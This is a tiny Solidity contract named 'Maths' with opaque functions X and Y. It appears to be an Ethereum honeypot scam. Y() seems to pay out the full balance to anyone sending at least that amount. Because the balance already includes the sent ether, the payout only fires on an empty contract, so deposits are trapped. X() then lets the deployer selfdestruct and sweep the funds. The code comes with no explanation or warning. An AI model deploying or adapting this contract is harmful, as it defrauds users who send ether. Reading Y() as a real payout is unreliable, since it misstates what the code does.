pragma solidity ^0.4.25;

contract Maths
{
    address Z = msg.sender;
    function() public payable {}
    function X() public { if (msg.sender==Z) selfdestruct(msg.sender); }
    function Y() public payable { if (msg.value >= this.balance) msg.sender.transfer(this.balance); }
 }